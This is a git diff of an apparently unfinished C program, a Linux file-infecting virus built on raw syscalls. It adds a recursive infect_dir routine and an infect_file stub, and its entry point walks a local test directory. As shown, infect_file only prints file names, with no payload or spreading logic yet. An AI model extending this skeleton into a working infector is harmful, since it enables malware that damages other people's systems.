@@ -1,5 +1,4 @@
 #include <fcntl.h>
-
 #include <dirent.h>     /* Defines DT_* constants */
 #include <fcntl.h>
 #include <stdio.h>
@@ -15,33 +14,6 @@ struct linux_dirent64 {
 	unsigned char	d_type;
 	char		d_name[0];
 };
-
-char * virus_itoa(long x, char *t)
-{
-	int i;
-	int j;
-	i = 0;
-	do
-	{
-		t[i] = (x % 10) + '0';
-		x /= 10;
-		i++;
-	} while (x!=0);
-	t[i] = 0;
-	for (j=0; j < i / 2; j++) {
-		t[j] ^= t[i - j - 1];
-		t[i - j - 1] ^= t[j];
-		t[j] ^= t[i - j - 1];
-	}
-	return t;
-}
-
-size_t virus_strlen(char *s)
-{
-	size_t size;
-	for (size=0;s[size];size++);
-	return size;
-}
 
 int virus_getdents64(unsigned int fd, struct linux_dirent64 *dirp,unsigned int count)
 {
@@ -113,6 +85,82 @@ void virus_exit(long status)
 		"syscall" : : "r"(status));
 }
 
+char * virus_itoa(long x, char *t)
+{
+	int i;
+	int j;
+	i = 0;
+	do
+	{
+		t[i] = (x % 10) + '0';
+		x /= 10;
+		i++;
+	} while (x!=0);
+	t[i] = 0;
+	for (j=0; j < i / 2; j++) {
+		t[j] ^= t[i - j - 1];
+		t[i - j - 1] ^= t[j];
+		t[j] ^= t[i - j - 1];
+	}
+	return t;
+}
+
+size_t virus_strlen(char *s)
+{
+	size_t size;
+	for (size=0;s[size];size++);
+	return size;
+}
+
+void virus_pathadd(char *path, char *dir, char *name){
+	int i=0;
+	int j=0;	
+	for(;i<virus_strlen(dir);i++) path[i] = dir[i];
+	//path[i++] = '/';
+	for(;j<virus_strlen(name);j++,i++) path[i] = name[j];
+	path[i] = '\0';
+}
+
+void getfullpath(){
+	
+}
+
+void infect_file(char *file){
+	virus_write(1, file,virus_strlen(file));
+	virus_write(1, "\n", 1);
+}
+
+//dir must end with /
+void infect_dir(char* path){
+	virus_write(1, path,virus_strlen(path));
+	virus_write(1, "\n", 1);
+	struct linux_dirent64 *d;
+	char buf[1024*1024];
+	int bpos;
+	int dir = virus_open(path,O_RDONLY | O_DIRECTORY, 0);
+	int nread = virus_getdents64(dir, (struct linux_dirent64 *)buf, 1024*1024);
+	for (bpos = 0; bpos < nread; bpos++) {
+		d = (struct linux_dirent64 *) (buf + bpos);
+		bpos += d->d_reclen - 1;
+		char fullpath[256];
+		virus_pathadd(fullpath, path, d->d_name);
+		//ignore all hide file .. and .
+		if(d->d_name[0] == '.') continue;
+		if(d->d_type == DT_REG){
+			infect_file(fullpath);
+		}else if(d->d_type == DT_DIR){
+			int endpos = virus_strlen(fullpath);
+			fullpath[endpos] = '/';
+			fullpath[endpos+1] = '\0';
+			infect_dir(fullpath);
+		}
+		/*
+		virus_write(1, d->d_name,virus_strlen(d->d_name));
+		virus_write(1, "\n", 1);
+		*/
+        }
+}
+
 void _start()
 {
 	/*
@@ -123,51 +171,35 @@ void _start()
 	virus_close(file);
 	virus_exit(0);
 	*/
+
+	/*
 	char buf[1024*1024];
-	int dir = virus_open("./test",O_RDONLY | O_DIRECTORY, 0);
+	char *start[1] = {"/home/lkm/workspace/virus/test"};
+	int dir = virus_open(start[0],O_RDONLY | O_DIRECTORY, 0);
 	char dirtmp[20];
 	//virus_write(1, virus_itoa(dir,dirtmp),13);
 	if(dir<0) virus_write(1,"dir wrong\n",13);
 	int nread = virus_getdents64(dir, (struct linux_dirent64 *)buf, 1024*1024);
 	if(nread<0) virus_write(1,"nread wrong\n",13);
-
-	/*
-	int i;
-	for(i=0; i<num; i++){
-		struct linux_dirent64 *d = (struct linux_dirent64 *)(c + i);
-		int dlen = d->d_reclen - 1;
-		virus_write(1,d->d_name,dlen);
-	}
-	*/
 	
 	struct linux_dirent64 *d;
 	int bpos;
-	char d_type;
-	char tmp[20];
 	//virus_write(1, virus_itoa(nread,tmp), 20);
 	//virus_write(1, "\n", 20);
 	for (bpos = 0; bpos < nread; bpos++) {
 		d = (struct linux_dirent64 *) (buf + bpos);
 		bpos += d->d_reclen - 1;
-		//virus_write(1,"get a file\n\0", 11);
+		if(d->d_type == DT_REG){
+			char fullpath[50];
+			getfullpath();
+		}else if(d->d_type == DT_REG){
+			
+		}
 		virus_write(1, d->d_name,virus_strlen(d->d_name));
 		virus_write(1, "\n", 1);
-		/*
-		virus_write(1, virus_itoa(d->d_ino,tmp),20);
-		virus_write(1, "\n", 20);
-		virus_write(1, virus_itoa(d->d_type,tmp),20);
-		virus_write(1, "\n", 20);
-		virus_write(1, virus_itoa(d->d_reclen,tmp),20);
-		virus_write(1, "\n", 20);
-		virus_write(1, virus_itoa(d->d_off,tmp),20);
-		virus_write(1, "\n", 20);
-		*/
-		//char name[20];
-		
-		//virus_write(1, d->d_name, 15);
-		
-		//bpos += d->d_reclen;
         }
-	
+	*/
+	char *start[1] = {"/home/lkm/workspace/virus/test/"};
+	infect_dir(start[0]);
 	virus_exit(0);
 }
